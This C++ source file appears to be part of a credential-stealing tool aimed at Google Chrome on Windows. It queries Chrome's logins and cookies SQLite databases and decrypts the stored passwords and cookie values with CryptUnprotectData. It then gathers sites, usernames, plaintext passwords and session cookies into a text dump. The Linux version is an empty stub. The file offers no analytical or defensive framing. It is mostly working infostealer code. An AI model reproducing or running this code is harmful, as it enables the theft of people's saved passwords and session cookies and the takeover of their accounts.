#include "tools.hpp"

#if defined(__WIN64__)

stringstream get_chrome_pass(sqlite3* db)
{
    string sql="SELECT action_url, username_value, password_value FROM logins";

    stringstream dump(string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc!=SQLITE_OK)
    {
        dump<<"statement failed rc="<<rc<<endl;
        return dump;
    }

    rc=sqlite3_step(pStmt);
    //cout<<"RC: "<<rc<<endl;
    while(rc==SQLITE_ROW)
    {
        dump<<sqlite3_column_text(pStmt, 0)<<endl;
        dump<<(char *)sqlite3_column_text(pStmt, 1)<<endl;

        DATA_BLOB encryptedPass, decryptedPass;

        encryptedPass.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData=(byte *)malloc((int)encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

        CryptUnprotectData(
                &encryptedPass,
                NULL,
                NULL,
                NULL,
                NULL,
                0,
                &decryptedPass);
        char *password=(char *)decryptedPass.pbData;
        while(isprint(*password))
        {
            dump<<*password;
            password++;
        }

        dump<<endl;
        free(encryptedPass.pbData);
        rc=sqlite3_step(pStmt);
    }
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return dump;
}

stringstream get_chrome_cookies(sqlite3* db)
{
    string sql="SELECT HOST_KEY, path, encrypted_value FROM cookies";

    stringstream dump(string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc=sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc!=SQLITE_OK)
    {
        dump<<"statement failed rc="<<rc<<endl;
        return dump;
    }
    cout<<endl;

    rc=sqlite3_step(pStmt);
    //cout<<"RC: "<<rc<<endl;
    while(rc==SQLITE_ROW)
    {
        dump<<sqlite3_column_text(pStmt, 0)<<" ";
        dump<<(char *)sqlite3_column_text(pStmt, 1)<<" ";

        DATA_BLOB encryptedCookies, decryptedCookies;

        encryptedCookies.cbData=(DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedCookies.pbData=(byte *)malloc((int)encryptedCookies.cbData);

        memcpy(encryptedCookies.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedCookies.cbData);

        CryptUnprotectData(
                &encryptedCookies,
                NULL,
                NULL,
                NULL,
                NULL,
                0,
                &decryptedCookies);
        //char *cookies=(char *)decryptedCookies.pbData;
        int i=0;
        while(decryptedCookies.pbData[i])
        {
            //dump<<*cookies;
            dump<<decryptedCookies.pbData[i];
            i++;
            //cookies++;
        }

        dump<<endl;
        free(encryptedCookies.pbData);
        rc=sqlite3_step(pStmt);
    }
    
    rc=sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return dump;
}

int callback(void *NotUsed, int argc, char **argv, char **azColName)
{
    for(int i=0; i < argc; i++)
    {
        cout<<azColName[i]<<": "<<argv[i]<<endl;
    }
    cout<<endl;
    return 0;
}

#elif defined(__linux__)

stringstream get_chrome_pass(sqlite3* db)
{
    return stringstream(string(""));
}

#endif
